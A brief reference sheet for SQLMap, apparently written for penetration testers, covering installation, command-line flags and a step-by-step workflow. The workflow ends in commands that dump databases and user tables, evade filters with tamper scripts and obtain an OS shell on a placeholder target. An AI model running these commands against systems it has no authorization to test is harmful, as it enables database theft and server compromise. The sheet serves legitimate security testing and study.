# SQLMap

## Purpose
Automated SQL injection detection and exploitation tool. Supports UNION, blind (Boolean/time-based), and out-of-band SQL injection for many database backends.

## Installation
```bash
sudo apt install sqlmap        # Debian/Ubuntu/Kali
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```

## Basic Usage
```bash
sqlmap -u "http://target.com/page?id=1"           # Test URL
sqlmap -r request.txt                              # Test from saved request
sqlmap -u "http://target.com/page?id=1" --dump    # Dump entire database
sqlmap -u "http://target.com/page?id=1" --os-shell  # Get OS shell
```

## Important Commands
- `-u URL` — Target URL
- `-r FILE` — Load HTTP request from file
- `--data=POSTDATA` — POST data body
- `-p PARAM` — Focus on specific parameter
- `--level=N` — Test depth (1-5, higher = more tests)
- `--risk=N` — Risk level (1-3, higher = more aggressive)
- `--dbs` — List databases
- `-D DB --tables` — List tables in database
- `-D DB -T TABLE --columns` — List columns
- `-D DB -T TABLE --dump` — Dump table data
- `--batch` — Non-interactive mode (default options)
- `--tamper=name` — Use tamper script (e.g., `space2comment`)
- `--os-shell` — Attempt OS command shell
- `--random-agent` — Random User-Agent header

## Typical Workflow
1. `sqlmap -u "http://target.com/item?id=5" --batch`
2. Enumerate: `--dbs` → `-D dbname --tables`
3. Extract: `-D dbname -T users --dump`
4. Advanced: `--os-shell` or `--sql-query="SELECT * FROM users"`

## Official Documentation
https://sqlmap.org/